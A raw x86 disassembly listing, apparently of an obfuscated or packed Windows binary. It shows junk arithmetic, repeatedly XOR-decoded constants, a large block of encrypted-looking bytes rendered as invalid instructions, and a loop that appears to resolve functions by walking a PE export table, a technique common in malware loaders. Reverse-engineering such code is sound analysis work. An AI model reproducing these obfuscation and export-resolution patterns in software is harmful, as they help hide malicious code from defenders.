  420fc1:	mov    DWORD PTR ds:0x4283a3,edi
  420fc7:	jmp    0x421029
  420fcc:	mov    DWORD PTR ds:0x4283a7,0x673a
  420fd6:	cmp    DWORD PTR ds:0x428287,0x0
  420fdd:	jle    0x420ffa
  420fe3:	push   DWORD PTR [ebp-0x20]
  420fe6:	call   DWORD PTR ds:0x428d74
  420fec:	xor    esi,edx
  420fee:	add    ecx,0x6ba8
  420ff4:	xor    edx,0x4b1f
  420ffa:	mov    edx,DWORD PTR ds:0x428307
  421000:	sbb    DWORD PTR ds:0x428283,edx
  421006:	movzx  edx,WORD PTR ds:0x42815b
  42100d:	or     edx,DWORD PTR ds:0x428383
  421013:	mov    DWORD PTR ds:0x42815b,edx
  421019:	dec    DWORD PTR ds:0x428373
  42101f:	sub    DWORD PTR ds:0x42827f,0x689b
  421029:	mov    DWORD PTR [ebp-0x174],eax
  42102f:	mov    eax,DWORD PTR [ebp-0x24]
  421032:	mov    ecx,DWORD PTR [ebp-0x94]
  421038:	add    esi,edx
  42103a:	mov    edx,DWORD PTR [ebp-0x10]
  42103d:	neg    esi
  42103f:	xor    edx,ecx
  421041:	cmp    DWORD PTR ds:0x42816b,0x0
  421048:	mov    DWORD PTR ds:0x428377,0x62d9
  421052:	mov    DWORD PTR ds:0x428157,0x300d
  42105c:	mov    DWORD PTR ds:0x42815b,0x20bd
  421066:	mov    ecx,DWORD PTR ds:0x4282ff
  42106c:	jmp    0x4210b5
  421071:	mov    DWORD PTR ds:0x42836f,0x134d
  42107b:	cmp    DWORD PTR ds:0x42816b,0x0
  421082:	jae    0x4210a9
  421088:	push   DWORD PTR [ebp-0xc]
  42108b:	push   0x4ac4
  421090:	push   DWORD PTR [ebp-0x24]
  421093:	push   0x863f
  421098:	push   DWORD PTR [ebp-0x28]
  42109b:	call   DWORD PTR ds:0x428d94
  4210a1:	sbb    ecx,DWORD PTR ds:0x428283
  4210a7:	adc    esi,esi
  4210a9:	and    DWORD PTR ds:0x4282a7,edi
  4210af:	sbb    ecx,DWORD PTR ds:0x428163
  4210b5:	add    edx,DWORD PTR [ebp-0x78]
  4210b8:	mov    ecx,DWORD PTR [ebp-0xc0]
  4210be:	lea    ecx,[edx+ecx*1+0x6ac1]
  4210c5:	and    ecx,eax
  4210c7:	mov    eax,0x1101
  4210cc:	sub    eax,ecx
  4210ce:	add    eax,DWORD PTR [ebp+0x8]
  4210d1:	mov    DWORD PTR [ebp-0x170],eax
  4210d7:	mov    DWORD PTR [ebp-0x15c],0xca79a575
  4210e1:	mov    DWORD PTR [ebp-0x158],0x9c1b89e8
  4210eb:	mov    DWORD PTR [ebp-0x154],0xca79a571
  4210f5:	mov    DWORD PTR [ebp-0x150],0x9c1b89e8
  4210ff:	mov    esi,DWORD PTR [ebp-0x174]
  421105:	mov    eax,DWORD PTR [ebp-0x154]
  42110b:	mov    edx,DWORD PTR [ebp-0x150]
  421111:	xor    eax,0xca79a575
  421116:	xor    edx,0x9c1b89e8
  42111c:	mov    cl,0x2
  42111e:	call   0x40a9b5
  421123:	mov    edi,eax
  421125:	mov    ebx,edx
  421127:	mov    eax,DWORD PTR [ebp-0x154]
  42112d:	mov    edx,DWORD PTR [ebp-0x150]
  421133:	xor    eax,0xca79a575
  421138:	xor    edx,0x9c1b89e8
  42113e:	mov    cl,0x3e
  421140:	call   0x42223a
  421145:	or     edi,eax
  421147:	or     ebx,edx
  421149:	jmp    0x42137d
  42114e:	test   al,0x92
  421150:	fdivr  st,st(3)
  421152:	and    bh,BYTE PTR [edx]
  421154:	call   0x6dbc:0x65828d2a
  42115b:	es mov ebx,0x160fc1b0
  421161:	sbb    dl,dh
  421163:	adc    al,0x18
  421165:	sbb    BYTE PTR [eax],dh
  421167:	and    esp,DWORD PTR [esi-0x2cfef5cf]
  42116d:	push   ss
  42116e:	mov    BYTE PTR [edx],dh
  421170:	adc    al,0x94
  421172:	dec    esi
  421173:	pop    ebp
  421174:	jp     0x421148
  421176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421177:	pusha  
  421178:	add    al,0x3
  42117a:	mov    ds:0xe0bdf5b,al
  42117f:	rol    esp,1
  421181:	fimul  DWORD PTR [edi-0x2]
  421184:	inc    esi
  421185:	cmp    eax,0x619d8082
  42118a:	push   ebx
  42118b:	mov    esi,0xf3a5c69d
  421190:	fdivr  QWORD PTR [ebx+0x31]
  421193:	adc    edi,edx
  421195:	jle    0x421168
  421197:	cmp    dh,bl
  421199:	out    0xf5,al
  42119b:	xchg   ecx,eax
  42119c:	data16 xchg dl,dh
  42119f:	jbe    0x421171
  4211a1:	dec    ecx
  4211a2:	test   eax,0x7cce99c5
  4211a7:	pop    esi
  4211a8:	sbb    DWORD PTR [edi-0x32807a2b],edi
  4211ae:	(bad)  
  4211af:	sti    
  4211b0:	shl    BYTE PTR es:[esi+ecx*4+0x38f62ee7],1
  4211b8:	jo     0x4211f8
  4211ba:	add    bl,BYTE PTR [ebp-0x4e1480d9]
  4211c0:	or     eax,0xc865ef8c
  4211c5:	shl    DWORD PTR [eax-0x2ec4cd99],0x85
  4211cc:	pop    ebp
  4211cd:	out    0x61,al
  4211cf:	or     al,0x1b
  4211d1:	and    DWORD PTR [ecx-0x559fb45a],ecx
  4211d7:	sub    al,BYTE PTR [esi]
  4211d9:	lahf   
  4211da:	ins    DWORD PTR es:[edi],dx
  4211db:	cmp    eax,0x935a39e6
  4211e0:	(bad)  
  4211e1:	ins    BYTE PTR es:[edi],dx
  4211e2:	xchg   BYTE PTR [ebx-0xb],dh
  4211e5:	add    al,0x58
  4211e7:	sar    DWORD PTR [ecx+0x1e],1
  4211ea:	sti    
  4211eb:	mov    DWORD PTR [edx],edx
  4211ed:	or     dl,BYTE PTR ds:0xc2370b75
  4211f3:	imul   esp,eax,0x42
  4211f6:	sbb    DWORD PTR [esi-0x36],0x1f07b7ea
  4211fd:	xchg   edx,eax
  4211fe:	aam    0xda
  421200:	adc    ah,BYTE PTR [edx+0x1f887602]
  421206:	and    ebx,DWORD PTR [edx-0x6c4be632]
  42120c:	cmc    
  42120d:	int    0x58
  42120f:	repnz or al,BYTE PTR [eax-0x53390f69]
  421216:	add    al,0x54
  421218:	inc    edi
  421219:	test   eax,0xfbd260c
  42121e:	push   0xffffffe1
  421220:	mov    ch,0xf1
  421222:	(bad)  
  421223:	cli    
  421224:	jb     0x4211c4
  421226:	daa    
  421227:	aam    0x32
  421229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42122a:	test   al,0x32
  42122c:	ret    
  42122d:	sti    
  42122e:	iret   
  42122f:	fld    st(5)
  421231:	and    DWORD PTR [esi-0x33],eax
  421234:	sub    al,0x85
  421236:	loop   0x4211e6
  421238:	in     al,0xfd
  42123a:	mov    ebx,0x5f2eedd4
  42123f:	push   ss
  421240:	lock imul esi,DWORD PTR [edi+0x39],0xffffffac
  421245:	fcom   DWORD PTR [ebx+0x38b49725]
  42124b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42124c:	or     ch,BYTE PTR [ebx+ebp*1]
  42124f:	lahf   
  421250:	dec    DWORD PTR [edi+ebx*2-0x6aaa60c5]
  421257:	fild   QWORD PTR [ecx+0x639ead5b]
  42125d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42125e:	jl     0x421202
  421260:	cwde   
  421261:	mov    al,0xe0
  421263:	mov    bh,0x5d
  421265:	lods   al,BYTE PTR ds:[esi]
  421266:	(bad)  
  421268:	ja     0x4212a0
  42126a:	pop    edx
  42126b:	inc    edx
  42126c:	ss jbe 0x421210
  42126f:	inc    esp
  421270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421271:	mov    eax,0x35b2b256
  421276:	addr16 shl ebp,0x98
  42127a:	mul    WORD PTR ds:0x88c40a76
  421281:	aad    0x85
  421283:	pop    es
  421284:	shr    DWORD PTR [ecx+0x13d8e632],0x3d
  42128b:	pusha  
  42128c:	dec    DWORD PTR [esi]
  42128e:	daa    
  42128f:	mov    ecx,0xe3b0ca40
  421294:	mov    es,WORD PTR [esi-0x38]
  421297:	push   eax
  421298:	ds (bad) 
  42129a:	pushf  
  42129b:	cmp    eax,0xf26ded33
  4212a0:	test   eax,0x39bf78e9
  4212a5:	js     0x421246
  4212a7:	jmp    0x4212c8
  4212a9:	push   ss
  4212aa:	and    dh,dl
  4212ac:	or     ebx,DWORD PTR [ebx]
  4212ae:	jge    0x42125c
  4212b0:	mov    al,ds:0x48eec6cd
  4212b5:	cmp    DWORD PTR [edx+0x70],ebp
  4212b8:	sub    ebx,ebp
  4212ba:	sbb    al,0x22
  4212bc:	xor    ah,BYTE PTR [ecx]
  4212be:	out    dx,eax
  4212bf:	xchg   edi,eax
  4212c0:	imul   edx,DWORD PTR [ebp-0x7ff8ec4d],0x746bf609
  4212ca:	test   ah,0xf2
  4212cd:	stc    
  4212ce:	rcr    BYTE PTR [eax],cl
  4212d0:	push   ebp
  4212d1:	es icebp 
  4212d3:	lahf   
  4212d4:	or     BYTE PTR [eax],dh
  4212d6:	stos   DWORD PTR es:[edi],eax
  4212d7:	sub    dh,BYTE PTR [esi+0x60]
  4212da:	leave  
  4212db:	mov    edx,0x86aaa7d3
  4212e0:	popa   
  4212e1:	imul   edi,ebp,0x8128ce0e
  4212e7:	sub    al,BYTE PTR [edi]
  4212e9:	dec    ecx
  4212ea:	(bad)
  4212ed:	sub    bl,BYTE PTR [eax-0x437ab609]
  4212f3:	cs inc eax
  4212f5:	pop    ebp
  4212f6:	(bad)  
  4212f7:	mov    dl,0x26
  4212f9:	(bad)  
  4212fb:	enter  0x9f2b,0xde
  4212ff:	mov    dh,0x92
  421301:	addr16 dec ecx
  421303:	sbb    edx,DWORD PTR [ecx]
  421305:	bound  esp,QWORD PTR [eax+0x610615a3]
  42130b:	add    dh,ah
  42130d:	push   ebp
  42130e:	mov    edx,0x6f0a6787
  421313:	jmp    0x42129b
  421315:	ss mov BYTE PTR fs:[edi-0x78301a98],bl
  42131d:	stos   BYTE PTR es:[edi],al
  42131e:	stos   DWORD PTR es:[edi],eax
  42131f:	shl    BYTE PTR [eax-0x777e679a],cl
  421325:	add    esp,esi
  421327:	mov    ch,ah
  421329:	fcom   QWORD PTR [esi-0x2944c5d4]
  42132f:	out    dx,al
  421330:	ins    BYTE PTR es:[edi],dx
  421331:	ss mov ebx,0xcf1eea36
  421337:	sub    edi,DWORD PTR [edx-0x3ffc8fad]
  42133d:	adc    al,0x97
  42133f:	(bad)  
  421341:	jnp    0x42134f
  421343:	ja     0x4212d9
  421345:	mov    edx,0x2fc1a4
  42134a:	sub    al,0xe3
  42134c:	dec    ebp
  42134d:	mov    DWORD PTR ds:0xf06e63d1,esi
  421353:	sbb    BYTE PTR [edx-0x55],0xbf
  421357:	es inc edi
  421359:	cmp    dh,BYTE PTR [eax]
  42135b:	mov    esi,0x2f215872
  421360:	mov    ebp,0x5fda08dd
  421365:	mov    ebp,0x65f1ad37
  42136a:	ins    DWORD PTR es:[edi],dx
  42136b:	enter  0xcf5b,0xf6
  42136f:	shl    dh,1
  421371:	retf   0xe74f
  421374:	stos   BYTE PTR es:[edi],al
  421375:	ja     0x4213f2
  421377:	dec    esp
  421378:	stos   BYTE PTR es:[edi],al
  421379:	dec    esi
  42137a:	jmp    0x4213d9
  42137c:	sbb    BYTE PTR [ebx-0x15b7b],cl
  421382:	dec    DWORD PTR [ebx-0x1576b]
  421388:	push   DWORD PTR ds:0xca79a575
  42138e:	xor    edx,0x9c1b89e8
  421394:	mov    cl,0x2
  421396:	call   0x40a9b5
  42139b:	mov    ecx,edx
  42139d:	mov    edx,DWORD PTR [ebp-0x15c]
  4213a3:	mov    DWORD PTR [ebp-0x218],esi
  4213a9:	mov    esi,DWORD PTR [ebp-0x158]
  4213af:	xor    edx,0xca79a575
  4213b5:	xor    esi,0x9c1b89e8
  4213bb:	mov    DWORD PTR [ebp-0x21c],eax
  4213c1:	mov    eax,edx
  4213c3:	mov    edx,esi
  4213c5:	mov    DWORD PTR [ebp-0x220],ecx
  4213cb:	mov    cl,0x3e
  4213cd:	call   0x42223a
  4213d2:	mov    esi,DWORD PTR [ebp-0x21c]
  4213d8:	or     esi,eax
  4213da:	mov    eax,DWORD PTR [ebp-0x220]
  4213e0:	or     eax,edx
  4213e2:	push   eax
  4213e3:	push   esi
  4213e4:	push   ebx
  4213e5:	push   edi
  4213e6:	call   0x416c20
  4213eb:	mov    esi,DWORD PTR [ebp-0x218]
  4213f1:	cmp    esi,eax
  4213f3:	jne    0x4214a9
  4213f9:	mov    eax,DWORD PTR [ebp-0x154]
  4213ff:	mov    edx,DWORD PTR [ebp-0x150]
  421405:	xor    eax,0xca79a575
  42140a:	xor    edx,0x9c1b89e8
  421410:	mov    cl,0x2
  421412:	call   0x40a9b5
  421417:	mov    esi,eax
  421419:	mov    edi,edx
  42141b:	mov    eax,DWORD PTR [ebp-0x154]
  421421:	mov    edx,DWORD PTR [ebp-0x150]
  421427:	xor    eax,0xca79a575
  42142c:	xor    edx,0x9c1b89e8
  421432:	mov    cl,0x3e
  421434:	call   0x42223a
  421439:	or     esi,eax
  42143b:	or     edi,edx
  42143d:	mov    eax,DWORD PTR [ebp-0x15c]
  421443:	mov    edx,DWORD PTR [ebp-0x158]
  421449:	xor    eax,0xca79a575
  42144e:	xor    edx,0x9c1b89e8
  421454:	mov    cl,0x2
  421456:	call   0x40a9b5
  42145b:	mov    ebx,eax
  42145d:	mov    eax,edx
  42145f:	mov    ecx,DWORD PTR [ebp-0x15c]
  421465:	mov    edx,DWORD PTR [ebp-0x158]
  42146b:	xor    ecx,0xca79a575
  421471:	xor    edx,0x9c1b89e8
  421477:	mov    DWORD PTR [ebp-0x224],eax
  42147d:	mov    eax,ecx
  42147f:	mov    cl,0x3e
  421481:	call   0x42223a
  421486:	or     ebx,eax
  421488:	mov    eax,DWORD PTR [ebp-0x224]
  42148e:	or     eax,edx
  421490:	push   eax
  421491:	push   ebx
  421492:	push   edi
  421493:	push   esi
  421494:	call   0x416c20
  421499:	mov    DWORD PTR [ebp-0x178],eax
  42149f:	jmp    0x421769
  4214a4:	jmp    0x42171f
  4214a9:	lea    eax,[ebp-0x168]
  4214af:	mov    DWORD PTR [ebp-0x164],eax
  4214b5:	mov    eax,DWORD PTR [ebp-0x164]
  4214bb:	mov    DWORD PTR [eax],0xa4069aae
  4214c1:	mov    eax,DWORD PTR [ebp-0x168]
  4214c7:	xor    eax,0xa4069aae
  4214cc:	shr    eax,0x2
  4214cf:	mov    ecx,DWORD PTR [ebp-0x168]
  4214d5:	xor    ecx,0xa4069aae
  4214db:	shl    ecx,0x1e
  4214de:	or     eax,ecx
  4214e0:	mov    ecx,DWORD PTR [ebp-0x174]
  4214e6:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  4214ea:	mov    DWORD PTR [ebp-0x160],eax
  4214f0:	mov    esi,DWORD PTR [ebp-0x160]
  4214f6:	mov    eax,DWORD PTR [ebp-0x154]
  4214fc:	mov    edx,DWORD PTR [ebp-0x150]
  421502:	xor    eax,0xca79a575
  421507:	xor    edx,0x9c1b89e8
  42150d:	mov    cl,0x2
  42150f:	call   0x40a9b5
  421514:	mov    edi,eax
  421516:	mov    ebx,edx
  421518:	mov    eax,DWORD PTR [ebp-0x154]
  42151e:	mov    edx,DWORD PTR [ebp-0x150]
  421524:	xor    eax,0xca79a575
  421529:	xor    edx,0x9c1b89e8
  42152f:	mov    cl,0x3e
  421531:	call   0x42223a
  421536:	or     edi,eax
  421538:	or     ebx,edx
  42153a:	mov    eax,DWORD PTR [ebp-0x15c]
  421540:	mov    edx,DWORD PTR [ebp-0x158]
  421546:	xor    eax,0xca79a575
  42154b:	xor    edx,0x9c1b89e8
  421551:	mov    cl,0x2
  421553:	call   0x40a9b5
  421558:	mov    ecx,edx
  42155a:	mov    edx,DWORD PTR [ebp-0x15c]
  421560:	mov    DWORD PTR [ebp-0x228],esi
  421566:	mov    esi,DWORD PTR [ebp-0x158]
  42156c:	xor    edx,0xca79a575
  421572:	xor    esi,0x9c1b89e8
  421578:	mov    DWORD PTR [ebp-0x22c],eax
  42157e:	mov    eax,edx
  421580:	mov    edx,esi
  421582:	mov    DWORD PTR [ebp-0x230],ecx
  421588:	mov    cl,0x3e
  42158a:	call   0x42223a
  42158f:	mov    esi,DWORD PTR [ebp-0x22c]
  421595:	or     esi,eax
  421597:	mov    eax,DWORD PTR [ebp-0x230]
  42159d:	or     eax,edx
  42159f:	push   eax
  4215a0:	push   esi
  4215a1:	push   ebx
  4215a2:	push   edi
  4215a3:	call   0x416c20
  4215a8:	mov    esi,DWORD PTR [ebp-0x228]
  4215ae:	cmp    esi,eax
  4215b0:	je     0x421625
  4215b6:	mov    eax,DWORD PTR [ebp-0x154]
  4215bc:	mov    edx,DWORD PTR [ebp-0x150]
  4215c2:	xor    eax,0xca79a575
  4215c7:	xor    edx,0x9c1b89e8
  4215cd:	mov    cl,0x2
  4215cf:	call   0x40a9b5
  4215d4:	mov    esi,eax
  4215d6:	mov    edi,edx
  4215d8:	mov    eax,DWORD PTR [ebp-0x154]
  4215de:	mov    edx,DWORD PTR [ebp-0x150]
  4215e4:	xor    eax,0xca79a575
  4215e9:	xor    edx,0x9c1b89e8
  4215ef:	mov    cl,0x3e
  4215f1:	call   0x42223a
  4215f6:	or     esi,eax
  4215f8:	or     edi,edx
  4215fa:	mov    eax,DWORD PTR [ebp-0x160]
  421600:	imul   esi,eax
  421603:	add    esi,DWORD PTR [ebp-0x170]
  421609:	mov    DWORD PTR [ebp-0x16c],esi
  42160f:	mov    eax,DWORD PTR [ebp-0x16c]
  421615:	mov    DWORD PTR [ebp-0x178],eax
  42161b:	jmp    0x421769
  421620:	jmp    0x4216d0
  421625:	mov    eax,DWORD PTR [ebp-0x154]
  42162b:	mov    edx,DWORD PTR [ebp-0x150]
  421631:	xor    eax,0xca79a575
  421636:	xor    edx,0x9c1b89e8
  42163c:	mov    cl,0x2
  42163e:	call   0x40a9b5
  421643:	mov    esi,eax
  421645:	mov    edi,edx
  421647:	mov    eax,DWORD PTR [ebp-0x154]
  42164d:	mov    edx,DWORD PTR [ebp-0x150]
  421653:	xor    eax,0xca79a575
  421658:	xor    edx,0x9c1b89e8
  42165e:	mov    cl,0x3e
  421660:	call   0x42223a
  421665:	or     esi,eax
  421667:	or     edi,edx
  421669:	mov    eax,DWORD PTR [ebp-0x15c]
  42166f:	mov    edx,DWORD PTR [ebp-0x158]
  421675:	xor    eax,0xca79a575
  42167a:	xor    edx,0x9c1b89e8
  421680:	mov    cl,0x2
  421682:	call   0x40a9b5
  421687:	mov    ebx,eax
  421689:	mov    eax,edx
  42168b:	mov    ecx,DWORD PTR [ebp-0x15c]
  421691:	mov    edx,DWORD PTR [ebp-0x158]
  421697:	xor    ecx,0xca79a575
  42169d:	xor    edx,0x9c1b89e8
  4216a3:	mov    DWORD PTR [ebp-0x234],eax
  4216a9:	mov    eax,ecx
  4216ab:	mov    cl,0x3e
  4216ad:	call   0x42223a
  4216b2:	or     ebx,eax
  4216b4:	mov    eax,DWORD PTR [ebp-0x234]
  4216ba:	or     eax,edx
  4216bc:	push   eax
  4216bd:	push   ebx
  4216be:	push   edi
  4216bf:	push   esi
  4216c0:	call   0x416c20
  4216c5:	mov    DWORD PTR [ebp-0x178],eax
  4216cb:	jmp    0x421769
  4216d0:	mov    eax,DWORD PTR [ebp-0x15c]
  4216d6:	mov    edx,DWORD PTR [ebp-0x158]
  4216dc:	xor    eax,0xca79a575
  4216e1:	xor    edx,0x9c1b89e8
  4216e7:	mov    cl,0x2
  4216e9:	call   0x40a9b5
  4216ee:	mov    esi,eax
  4216f0:	mov    edi,edx
  4216f2:	mov    eax,DWORD PTR [ebp-0x15c]
  4216f8:	mov    edx,DWORD PTR [ebp-0x158]
  4216fe:	xor    eax,0xca79a575
  421703:	xor    edx,0x9c1b89e8
  421709:	mov    cl,0x3e
  42170b:	call   0x42223a
  421710:	or     esi,eax
  421712:	or     edi,edx
  421714:	mov    DWORD PTR [ebp-0x178],esi
  42171a:	jmp    0x421769
  42171f:	mov    eax,DWORD PTR [ebp-0x15c]
  421725:	mov    edx,DWORD PTR [ebp-0x158]
  42172b:	xor    eax,0xca79a575
  421730:	xor    edx,0x9c1b89e8
  421736:	mov    cl,0x2
  421738:	call   0x40a9b5
  42173d:	mov    esi,eax
  42173f:	mov    edi,edx
  421741:	mov    eax,DWORD PTR [ebp-0x15c]
  421747:	mov    edx,DWORD PTR [ebp-0x158]
  42174d:	xor    eax,0xca79a575
  421752:	xor    edx,0x9c1b89e8
  421758:	mov    cl,0x3e
  42175a:	call   0x42223a
  42175f:	or     esi,eax
  421761:	or     edi,edx
  421763:	mov    DWORD PTR [ebp-0x178],esi
  421769:	mov    ecx,DWORD PTR [ebp-0xd8]
  42176f:	mov    eax,0x459a
  421774:	xor    edx,edx
  421776:	div    ecx
  421778:	mov    ecx,DWORD PTR [ebp-0xdc]
  42177e:	and    eax,ecx
  421780:	add    eax,DWORD PTR [ebp-0x44]
  421783:	mov    ecx,DWORD PTR [ebp-0xe0]
  421789:	lea    eax,[eax+ecx*1+0x272f]
  421790:	xor    eax,0x1080c
  421795:	add    eax,DWORD PTR [ebp-0x178]
  42179b:	mov    DWORD PTR [ebp-0xe8],eax
  4217a1:	mov    DWORD PTR [ebp-0xc],0x5950
  4217a8:	mov    DWORD PTR [ebp-0xf8],0x4964
  4217b2:	mov    DWORD PTR [ebp-0x130],0x3
  4217bc:	mov    DWORD PTR [ebp-0x20],0x2df9
  4217c3:	mov    DWORD PTR [ebp-0x8],0x4524
  4217ca:	mov    DWORD PTR [ebp-0xd4],0x637e
  4217d4:	mov    DWORD PTR [ebp-0x110],0x38c8
  4217de:	mov    DWORD PTR [ebp-0xa4],0x7118
  4217e8:	mov    DWORD PTR [ebp-0xa0],0xaf6
  4217f2:	mov    DWORD PTR [ebp-0x10c],0x3315
  4217fc:	mov    eax,DWORD PTR [ebp-0xf8]
  421802:	mov    ecx,DWORD PTR [ebp-0x130]
  421808:	xor    edx,edx
  42180a:	div    ecx
  42180c:	add    eax,0x454e
  421811:	mov    ecx,DWORD PTR [ebp-0xc]
  421814:	and    eax,ecx
  421816:	xor    eax,0x5940
  42181b:	add    eax,DWORD PTR [ebp+0x8]
  42181e:	mov    ecx,DWORD PTR [ebp-0x110]
  421824:	mov    edx,DWORD PTR [ebp-0xa4]
  42182a:	sub    ecx,edx
  42182c:	mov    edx,DWORD PTR [ebp-0xd4]
  421832:	or     ecx,edx
  421834:	mov    edx,DWORD PTR [ebp-0x8]
  421837:	and    ecx,edx
  421839:	mov    edx,DWORD PTR [ebp-0x20]
  42183c:	xor    ecx,edx
  42183e:	mov    edx,DWORD PTR [ebp-0x10c]
  421844:	mov    esi,0x180f
  421849:	sub    esi,edx
  42184b:	mov    edx,DWORD PTR [ebp-0xa0]
  421851:	imul   esi,edx
  421854:	xor    esi,0x402b
  42185a:	xor    esi,0xfed78c17
  421860:	mov    edx,DWORD PTR [ebp-0xe8]
  421866:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  42186d:	add    ecx,eax
  42186f:	add    esi,ecx
  421871:	mov    DWORD PTR [ebp-0x38],esi
  421874:	mov    DWORD PTR [ebp-0x4],0x59a8
  42187b:	mov    DWORD PTR [ebp-0x30],0x7021
  421882:	mov    DWORD PTR [ebp-0xf4],0x6210
  42188c:	mov    DWORD PTR [ebp-0x58],0x73d5
  421893:	mov    DWORD PTR [ebp-0x124],0x1e7d
  42189d:	mov    DWORD PTR [ebp-0x3c],0x3144
  4218a4:	mov    eax,DWORD PTR [ebp-0x30]
  4218a7:	xor    eax,0x75cb
  4218ac:	mov    ecx,DWORD PTR [ebp-0x4]
  4218af:	imul   eax,ecx
  4218b2:	mov    ecx,DWORD PTR [ebp+0x8]
  4218b5:	lea    ecx,[ecx+eax*1-0x2123b90]
  4218bc:	mov    eax,DWORD PTR [ebp-0xf4]
  4218c2:	and    eax,0x6b34
  4218c7:	and    eax,0x658d
  4218cc:	xor    edx,edx
  4218ce:	push   0x6
  4218d0:	pop    esi
  4218d1:	div    esi
  4218d3:	imul   eax,eax,0x3fb9
  4218d9:	mov    edx,DWORD PTR [ebp-0x3c]
  4218dc:	and    edx,0x58c7
  4218e2:	mov    esi,DWORD PTR [ebp-0x124]
  4218e8:	or     edx,esi
  4218ea:	add    edx,0x7a25
  4218f0:	imul   edx,edx,0x28d2
  4218f6:	mov    esi,DWORD PTR [ebp-0x58]
  4218f9:	xor    edx,esi
  4218fb:	xor    edx,0x1856f731
  421901:	mov    esi,DWORD PTR [ebp-0xe8]
  421907:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  42190e:	add    eax,ecx
  421910:	add    edx,eax
  421912:	mov    DWORD PTR [ebp-0xac],edx
  421918:	mov    DWORD PTR [ebp-0x54],0x1
  42191f:	mov    DWORD PTR [ebp-0x40],0x1ee8
  421926:	mov    DWORD PTR [ebp-0x1c],0x64d8
  42192d:	mov    DWORD PTR [ebp-0xf0],0x5a06
  421937:	mov    DWORD PTR [ebp-0x108],0x2eeb
  421941:	mov    DWORD PTR [ebp-0x104],0x2108
  42194b:	mov    eax,DWORD PTR [ebp-0x1c]
  42194e:	xor    edx,edx
  421950:	push   0x3
  421952:	pop    ecx
  421953:	div    ecx
  421955:	mov    ecx,DWORD PTR [ebp-0x40]
  421958:	or     eax,ecx
  42195a:	mov    ecx,DWORD PTR [ebp-0x54]
  42195d:	xor    edx,edx
  42195f:	div    ecx
  421961:	imul   eax,eax,0x7d53
  421967:	mov    ecx,DWORD PTR [ebp+0x8]
  42196a:	lea    eax,[ecx+eax*1-0x1f534807]
  421971:	mov    ecx,DWORD PTR [ebp-0xf0]
  421977:	and    ecx,0x4108
  42197d:	and    ecx,0x40e7
  421983:	sub    ecx,0x1a54
  421989:	xor    ecx,0x25ac
  42198f:	mov    edx,DWORD PTR [ebp-0x104]
  421995:	xor    edx,0x6dda
  42199b:	mov    esi,DWORD PTR [ebp-0x108]
  4219a1:	and    edx,esi
  4219a3:	and    edx,0xe0c
  4219a9:	or     edx,0x5b
  4219ac:	mov    esi,DWORD PTR [ebp-0xe8]
  4219b2:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  4219b6:	add    ecx,eax
  4219b8:	lea    eax,[edx+ecx*1-0xc5b]
  4219bf:	mov    DWORD PTR [ebp-0xa8],eax
  4219c5:	and    DWORD PTR [ebp-0x144],0x0
  4219cc:	jmp    0x4219de
  4219d1:	mov    eax,DWORD PTR [ebp-0x144]
  4219d7:	inc    eax
  4219d8:	mov    DWORD PTR [ebp-0x144],eax
  4219de:	mov    eax,DWORD PTR [ebp-0xe8]
  4219e4:	mov    ecx,DWORD PTR [ebp-0x144]
  4219ea:	cmp    ecx,DWORD PTR [eax+0x18]
  4219ed:	je     0x421fa6
  4219f3:	mov    eax,DWORD PTR [ebp-0x144]
  4219f9:	mov    ecx,DWORD PTR [ebp-0x38]
  4219fc:	mov    edx,DWORD PTR [ebp+0x8]
  4219ff:	add    edx,DWORD PTR [ecx+eax*4]
  421a02:	mov    DWORD PTR [ebp-0x48],edx
  421a05:	mov    eax,DWORD PTR [ebp-0x48]
  421a08:	mov    DWORD PTR [ebp-0x210],eax
  421a0e:	mov    eax,DWORD PTR [ebp+0xc]
  421a11:	mov    DWORD PTR [ebp-0x20c],eax
  421a17:	mov    DWORD PTR [ebp-0x1f0],0xca79a575
  421a21:	mov    DWORD PTR [ebp-0x1ec],0x9c1b89e8
  421a2b:	mov    DWORD PTR [ebp-0x1e0],0xca79a571
  421a35:	mov    DWORD PTR [ebp-0x1dc],0x9c1b89e8
  421a3f:	lea    eax,[ebp-0x1e8]
  421a45:	mov    DWORD PTR [ebp-0x1f4],eax
  421a4b:	mov    eax,DWORD PTR [ebp-0x20c]
  421a51:	movzx  eax,WORD PTR [eax+0x20]
  421a55:	xor    eax,0xa49b
  421a5a:	movzx  eax,ax
  421a5d:	sar    eax,1
  421a5f:	mov    ecx,DWORD PTR [ebp-0x20c]
  421a65:	movzx  ecx,WORD PTR [ecx+0x20]
  421a69:	xor    ecx,0xa49b
  421a6f:	movzx  ecx,cx
  421a72:	shl    ecx,0xf
  421a75:	or     eax,ecx
  421a77:	movzx  eax,ax
  421a7a:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421a80:	mov    DWORD PTR [ecx],eax
  421a82:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a88:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a8e:	xor    eax,0xca79a575
  421a93:	xor    edx,0x9c1b89e8
  421a99:	mov    cl,0x2
  421a9b:	call   0x40a9b5
  421aa0:	mov    ebx,eax
  421aa2:	mov    esi,edx
  421aa4:	mov    eax,DWORD PTR [ebp-0x1e0]
  421aaa:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ab0:	xor    eax,0xca79a575
  421ab5:	xor    edx,0x9c1b89e8
  421abb:	mov    cl,0x3e
  421abd:	call   0x42223a
  421ac2:	or     ebx,eax
  421ac4:	or     esi,edx
  421ac6:	movzx  eax,bl
  421ac9:	push   eax
  421aca:	lea    eax,[ebp-0x198]
  421ad0:	push   eax
  421ad1:	call   0x416c9e
  421ad6:	mov    eax,DWORD PTR [ebp-0x1f0]
  421adc:	mov    edx,DWORD PTR [ebp-0x1ec]
  421ae2:	xor    eax,0xca79a575
  421ae7:	xor    edx,0x9c1b89e8
  421aed:	mov    cl,0x2
  421aef:	call   0x40a9b5
  421af4:	mov    esi,eax
  421af6:	mov    edi,edx
  421af8:	mov    eax,DWORD PTR [ebp-0x1f0]
  421afe:	mov    edx,DWORD PTR [ebp-0x1ec]
